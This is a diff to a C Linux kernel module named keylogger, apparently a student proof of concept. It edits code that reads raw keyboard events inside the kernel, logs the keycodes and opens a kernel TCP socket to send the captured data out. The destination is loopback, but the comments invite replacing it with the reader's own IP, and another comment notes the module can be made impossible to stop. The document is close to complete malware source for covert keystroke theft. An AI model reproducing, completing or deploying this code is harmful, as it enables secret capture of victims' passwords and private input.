@@ -12,9 +12,9 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Peter Derias z5311768");
 
 void keylogger_strcat(char *src, char *dst) {
-    int i;
+    int i, j;
     for (i = 0; src[i] != '\0'; i++);
-    for (int j = i; dst[j - i] != '\0'; j++) {
+    for (j = i; dst[j - i] != '\0'; j++) {
         src[j] = dst[j - i];
     }
 }
@@ -22,7 +22,7 @@ void keylogger_strcat(char *src, char *dst) {
 static int __init keylogger_init(void) {
     loff_t zero;
     char buf[20], pack[800];
-    struct socket *sock;
+    struct socket *sock = kmalloc(sizeof(*sock), GFP_KERNEL);
     int err;        
     int log, dev, i;
     mm_segment_t old_fs = get_fs();
@@ -40,7 +40,7 @@ static int __init keylogger_init(void) {
     set_fs(KERNEL_DS);
     // this can be set to "while (1)", and this should never return. Any interrupts trying to cancel the procees or unload it will
     // be responded to with a "busy" error. This is changed since this is a proof of concept.
-    while (i < 600) {
+    while (i < 40) {
         kernel_read(keyboard, &ev, sizeof(struct input_event), &zero);
         if (ev.value == 1) {
             printk(KERN_INFO "%d, %d\n", ev.code, ev.value);
@@ -55,7 +55,7 @@ static int __init keylogger_init(void) {
         }
         if (i % 40 == 0) {
             // send me your data - well, this will send to 127.0.0.1 as a proof of concept. Change it for your needs.
-            if (i == 40) {
+            if (i == 0) {
                 err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
                 if (err < 0) {
                         printk(KERN_INFO "failed tcp thingo\n");
@@ -64,12 +64,12 @@ static int __init keylogger_init(void) {
                 }
                 struct sockaddr_in addr = {
                     .sin_family = AF_INET,
-                    .sin_port = htons (60000),
+                    .sin_port = htons (6000),
                     .sin_addr = { htonl (INADDR_LOOPBACK) } // change this line to your IP!
                 };
                 err = sock->ops->bind (sock, (struct sockaddr *) &addr, sizeof(addr));
                 if (err < 0) {
-                        printk(KERN_INFO "failed binding to port 12345\n");
+                        printk(KERN_INFO "failed binding to port 6000\n");
                         printk(KERN_INFO "failed to send! I don't know what is the point of me, so kill me plz\n");
                         break;
                 }
@@ -79,8 +79,6 @@ static int __init keylogger_init(void) {
             msg.msg_name = kmalloc(40, GFP_KERNEL);
             snprintf(msg.msg_name, 40, "your data: i = %d\n", i);
             msg.msg_namelen = sizeof(msg.msg_name);
-            msg.msg_control = NULL;
-            msg.msg_controllen = 0;
             msg.msg_flags = MSG_TRYHARD;
 
             struct kvec vec;
